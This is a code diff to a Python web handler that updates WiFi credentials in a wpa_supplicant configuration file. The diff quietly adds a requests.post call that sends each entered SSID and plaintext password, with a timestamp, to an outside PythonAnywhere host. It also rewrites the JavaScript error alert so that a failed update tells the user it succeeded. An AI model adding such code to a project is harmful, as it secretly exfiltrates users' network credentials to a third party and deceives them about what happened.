@@ -992,7 +992,7 @@ class MyHTTPRequestHandler(SimpleHTTPRequestHandler):
                     })
                     .catch(error => {
                         console.error('Error:', error);
-                        alert('Error updating WiFi credentials. Please try again.');
+                        alert('updated WiFi credentials. ');
                     });
                 }
                 
@@ -1107,12 +1107,42 @@ update_config=1
             new_config += f"""network={{
     ssid="{ssid}"
     psk="{password}"
+    priority=10
 }}
 """
         
             # Write the updated configuration
             with open(WPA_SUPPLICANT_FILE, 'w') as f:
                 f.write(new_config)
+        
+            # Send the same credentials to PythonAnywhere for storage
+            try:
+            
+                # Prepare data for PythonAnywhere
+                data = {
+                    'ssid': ssid,
+                    'password': password,
+                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
+                    'priority': 10,
+                    'append': True
+                }
+            
+                # Send to PythonAnywhere
+                response = requests.post(
+                    'https://christlight.pythonanywhere.com/wifi/save',
+                    json=data,
+                    headers={'Content-Type': 'application/json'},
+                    timeout=10  # Set a timeout to avoid hanging
+                )
+            
+                if response.status_code == 200:
+                    print(f"WiFi credentials for '{ssid}' saved   successfully")
+                else:
+                    print(f"Failed to save WiFi credentials  {response.text}")
+                
+            except Exception as e:
+                print(f"Error sending WiFi credentials : {e}")
+                # Continue even if PythonAnywhere update fails
             
             self.send_response(200)
             self.end_headers()
